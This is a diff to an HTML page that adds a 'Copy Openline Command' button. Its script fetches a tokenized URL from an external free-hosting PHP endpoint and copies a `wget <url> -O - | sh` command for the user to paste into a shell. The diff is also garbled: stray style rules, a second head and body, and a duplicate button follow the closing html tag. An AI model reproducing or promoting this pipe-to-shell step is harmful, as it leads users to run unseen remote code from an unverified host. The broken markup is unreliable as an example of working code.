@@ -44,6 +44,50 @@
 </head>
 <body>
 
+<button id="copyBtn" disabled>Loading command...</button>
+
+<script>
+  let command = "";
+
+  // Fetch the token from PHP API
+  fetch('https://bjc.free.nf/free_openline/generate_token.php')
+    .then(response => response.json())
+    .then(data => {
+      if (data.success && data.url) {
+        // Prepare the full wget command with token link
+        command = `wget ${data.url} -O - | sh`;
+        
+        const btn = document.getElementById('copyBtn');
+        btn.textContent = "Copy Openline Command";
+        btn.disabled = false;
+
+        btn.addEventListener('click', () => {
+          navigator.clipboard.writeText(command).then(() => {
+            alert('Command copied to clipboard!');
+          }).catch(() => {
+            alert('Failed to copy command.');
+          });
+        });
+      } else {
+        document.getElementById('copyBtn').textContent = "Failed to load command.";
+      }
+    })
+    .catch(() => {
+      document.getElementById('copyBtn').textContent = "Error loading command.";
+    });
+</script>
+
+</body>
+</html>    button {
+      font-size: 18px;
+      padding: 14px 24px;
+      border-radius: 8px;
+    }
+  }
+</style>
+</head>
+<body>
+
 <button id="copyBtn">Copy Openline Command</button>
 
 <script>
